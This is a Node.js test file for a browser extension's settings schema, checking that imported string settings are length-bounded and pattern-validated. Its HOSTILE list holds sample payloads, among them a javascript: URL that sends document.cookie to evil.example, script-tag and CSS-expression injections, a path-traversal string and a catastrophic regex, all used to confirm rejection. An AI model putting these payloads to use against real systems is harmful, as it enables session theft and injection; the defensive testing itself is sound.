'use strict';

// `clampSettingValue` narrows numbers and coerces enums, but a `type: "string"`
// setting used to accept whatever a backup carried. That is how a catastrophic
// regex reached the Video Hider keyword filter and an arbitrary origin reached
// the alternative-frontend link: both were fixed at their own call sites, and
// the class stayed open at the boundary until these constraints landed.

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

const repoRoot = path.join(__dirname, '..');
const { SETTINGS_SCHEMA } = require('../extension/core/settings-schema.js');

function loadPolicy() {
    // The factory takes the schema explicitly. Passing it beats relying on the
    // module's own lookup: the first version of this harness loaded both files
    // into a vm where that lookup found nothing, so EVERY key came back
    // "unknown setting" and the refusal assertions passed for the wrong reason.
    const { createPolicyProfile } = require('../extension/core/policy-profile.js');
    return createPolicyProfile({ schema: SETTINGS_SCHEMA });
}

const freeFormStrings = SETTINGS_SCHEMA.filter(
    (entry) => entry.type === 'string' && !(Array.isArray(entry.enum) && entry.enum.length)
);

test('every free-form string setting declares a length bound', () => {
    const unbounded = freeFormStrings
        .filter((entry) => typeof entry.maxLength !== 'number')
        .map((entry) => entry.key);
    assert.deepEqual(unbounded, [],
        'an unbounded string setting accepts whatever a backup carries');
});

test('every declared constraint admits its own default', () => {
    // A constraint that rejects the shipped default would make a clean profile
    // unimportable, which is a worse failure than the one it guards.
    for (const entry of freeFormStrings) {
        const value = String(entry.defaultValue ?? '');
        assert.ok(value.length <= entry.maxLength,
            `${entry.key}: default is longer than its own maxLength`);
        if (entry.pattern) {
            assert.match(value, new RegExp(entry.pattern),
                `${entry.key}: default does not satisfy its own pattern`);
        }
    }
});

test('every schema pattern compiles', () => {
    for (const entry of freeFormStrings) {
        if (!entry.pattern) continue;
        assert.doesNotThrow(() => new RegExp(entry.pattern),
            `${entry.key}: pattern must be a valid regular expression`);
    }
});

test('an over-long value is refused at every bounded string key', () => {
    const policy = loadPolicy();
    for (const entry of freeFormStrings) {
        const hostile = 'a'.repeat(entry.maxLength + 1);
        const result = policy.validateSettingsSnapshot({ [entry.key]: hostile });
        assert.equal(result.ok, false, `${entry.key}: an over-long value must be refused`);
        assert.ok(!Object.prototype.hasOwnProperty.call(result.settings, entry.key),
            `${entry.key}: a refused value must not be stored`);
    }
});

test('a pattern-violating value is refused at every patterned key', () => {
    const policy = loadPolicy();
    // One hostile value per shape. Each is the thing the pattern exists to stop.
    const HOSTILE = [
        'javascript:fetch("//evil.example/"+document.cookie)',
        'http://evil.example',
        '<script>alert(1)</script>',
        'url(//evil.example/x.png)',
        '../../etc/passwd',
        'expression(alert(1))'
    ];
    for (const entry of freeFormStrings) {
        if (!entry.pattern) continue;
        const compiled = new RegExp(entry.pattern);
        const refused = HOSTILE.filter((value) => !compiled.test(value));
        assert.ok(refused.length > 0,
            `${entry.key}: its pattern admits every hostile sample, so it constrains nothing`);
        for (const value of refused) {
            const result = policy.validateSettingsSnapshot({ [entry.key]: value });
            assert.equal(result.ok, false,
                `${entry.key}: ${JSON.stringify(value).slice(0, 40)} must be refused`);
            assert.ok(!Object.prototype.hasOwnProperty.call(result.settings, entry.key),
                `${entry.key}: a refused value must not be stored`);
        }
    }
});

test('the two settings that already caused incidents are constrained', () => {
    const policy = loadPolicy();
    // The catastrophic regex from the ReDoS fix, oversized past the cap.
    const redos = '/' + '(a+)'.repeat(5000) + 'b/';
    const keyword = policy.validateSettingsSnapshot({ hideVideosKeywordFilter: redos });
    assert.equal(keyword.ok, false, 'an oversized keyword filter must be refused');

    // The open redirect from the alternative-frontend fix.
    for (const value of ['javascript:alert(1)', 'http://evil.example', 'data:text/html,x']) {
        const redirect = policy.validateSettingsSnapshot({ alternativeFrontendInstance: value });
        assert.equal(redirect.ok, false, `${value} must be refused as a frontend instance`);
    }
    // And the legitimate one still passes.
    const good = policy.validateSettingsSnapshot({ alternativeFrontendInstance: 'https://invidious.example' });
    assert.equal(good.ok, true, 'a real https instance must still import');
    assert.equal(good.settings.alternativeFrontendInstance, 'https://invidious.example');
});

test('ordinary values a user really sets still import', () => {
    const policy = loadPolicy();
    const REAL = {
        hideVideosKeywordFilter: 'sponsored, /crypto.*giveaway/i, clickbait',
        customCssCode: 'ytd-app { --my-var: 4px; }\n#content { padding: 2px; }',
        themeAccentColor: '#a78bfa',
        selectionColor: 'rgba(45, 211, 111, 0.4)',
        subStyleColor: 'white',
        transcriptPreferredLanguage: 'pt-BR',
        preferredAudioLang: 'en',
        aiSummaryModel: 'gpt-4o-mini',
        aiSummaryEndpoint: 'http://127.0.0.1:11434/v1/chat/completions',
        downloadCobaltInstance: 'https://cobalt.example/api/json',
        commentLanguageAllowlist: 'en, pt, es',
        quickLinkItems: 'History | /feed/history\nWatch Later | /playlist?list=WL'
    };
    for (const [key, value] of Object.entries(REAL)) {
        const result = policy.validateSettingsSnapshot({ [key]: value });
        assert.equal(result.ok, true,
            `${key}: a realistic value must import, got ${JSON.stringify(result.errors)}`);
        assert.equal(result.settings[key], value, `${key}: the value must survive unchanged`);
    }
});

// WHEN a value already in local storage violates its schema constraint, the
// export path SHALL default that key and name it, and SHALL still produce a
// backup — while the import path SHALL still refuse the same value.
//
// The constraints landed on the export and sync paths only. The write path
// kept a flat 256 KiB cap, so a settings-panel textarea with no maxlength
// could store 5,000 characters into a 4,000-character setting and the next
// backup threw "Settings export rejected" instead of producing a file. A
// backup is what you want most at exactly that moment.
test('a locally-stored value that breaks its constraint is repaired on the way out, not refused', () => {
    const policy = loadPolicy();
    const entry = SETTINGS_SCHEMA.find((item) => item.key === 'quickLinkItems');
    const oversized = 'x'.repeat(entry.maxLength + 1);

    const repaired = policy.validateSettingsSnapshot(
        { quickLinkItems: oversized }, { repairInvalid: true });
    assert.equal(repaired.ok, true, 'a backup must remain possible');
    assert.equal(repaired.settings.quickLinkItems, entry.defaultValue);
    assert.deepEqual(repaired.repairedKeys.map((item) => item.key), ['quickLinkItems']);
    assert.match(repaired.repairedKeys[0].reason, /too long/);

    // Import is the other direction and keeps the hard rejection.
    const imported = policy.validateSettingsSnapshot({ quickLinkItems: oversized });
    assert.equal(imported.ok, false);
    assert.equal(imported.repairedKeys.length, 0);
});

// WHEN a value is refused, the error SHALL say why it was refused.
test('a length or shape refusal is not reported as a type error', () => {
    const policy = loadPolicy();
    const long = policy.validateSettingsSnapshot({ customCssCode: 'a'.repeat(20001) });
    assert.equal(long.ok, false);
    assert.match(long.errors[0], /customCssCode/);
    assert.match(long.errors[0], /too long: 20001 characters, limit 20000/);
    assert.doesNotMatch(long.errors[0], /expected string/);

    const shaped = policy.validateSettingsSnapshot({ aiSummaryEndpoint: 'ftp://example.test/x' });
    assert.equal(shaped.ok, false);
    assert.match(shaped.errors[0], /does not match the accepted format/);

    // A genuine type error still reads as one.
    const typed = policy.validateSettingsSnapshot({ customCssCode: 42 });
    assert.equal(typed.ok, false);
    assert.match(typed.errors[0], /invalid type: expected string/);
});

// WHEN the user names a profile the way people actually name things, the name
// SHALL survive a backup round trip.
test('profile names people actually type are accepted', () => {
    const policy = loadPolicy();
    // ytkit.js accepts any trimmed non-empty name, and imported JSON can carry
    // one too. The first pattern here was ^[A-Za-z0-9_-]{1,64}$, which refused
    // every one of these and took backup export down with it.
    for (const name of ['default', 'Work laptop', 'Musik & Video', '日常', 'kid-safe.v2']) {
        const result = policy.validateSettingsSnapshot({ _activeProfile: name });
        assert.equal(result.ok, true, `profile name rejected: ${name}`);
        assert.equal(result.settings._activeProfile, name);
    }
    // A name is a label, not a payload: control characters still go.
    for (const bad of ['line\nbreak', 'tab\tstop', 'x'.repeat(65)]) {
        assert.equal(policy.validateSettingsSnapshot({ _activeProfile: bad }).ok, false);
    }
});

// WHEN a language preference is cleared, the empty value SHALL be accepted.
test('clearing a language field is a legal state', () => {
    const policy = loadPolicy();
    for (const key of ['autoSubtitleLang', 'preferredAudioLang', 'transcriptPreferredLanguage']) {
        assert.equal(policy.validateSettingsSnapshot({ [key]: '' }).ok, true,
            `${key} must accept "no preference"`);
        assert.equal(policy.validateSettingsSnapshot({ [key]: 'pt-BR' }).ok, true);
        assert.equal(policy.validateSettingsSnapshot({ [key]: 'not a tag' }).ok, false);
    }
});

// WHEN a setting is written through the cross-context controller, the schema's
// own bound SHALL apply there too, so a value that the export path would
// refuse can never reach storage in the first place.
test('the write path enforces the same bounds the export path does', () => {
    const source = fs.readFileSync(
        path.join(repoRoot, 'extension', 'core', 'settings-controller.js'), 'utf8');
    const start = source.indexOf('function isValueValid(');
    assert.ok(start > 0, 'the write-path validator must still be here');
    const body = source.slice(start, source.indexOf('\n    function clampValue(', start));
    assert.match(body, /entry\.maxLength/,
        'the write path must honour the schema length bound, not only the flat cap');
    assert.match(body, /entry\.pattern/,
        'the write path must honour the schema pattern');
    assert.match(body, /MAX_SETTING_STRING_LENGTH/,
        'the flat cap still guards settings with no schema bound');
});

// WHEN the settings panel renders a free-text field, the browser SHALL stop the
// user at the schema bound rather than letting an unstorable value be typed.
test('the settings panel caps its textareas at the schema bound', () => {
    const source = fs.readFileSync(
        path.join(repoRoot, 'extension', 'features', 'settings-panel', 'index.js'), 'utf8');
    assert.match(source, /textarea\.maxLength = textareaEntry\.maxLength/,
        'the textarea had no cap at all, which is how a 5,000-character value reached a 4,000-character setting');
});
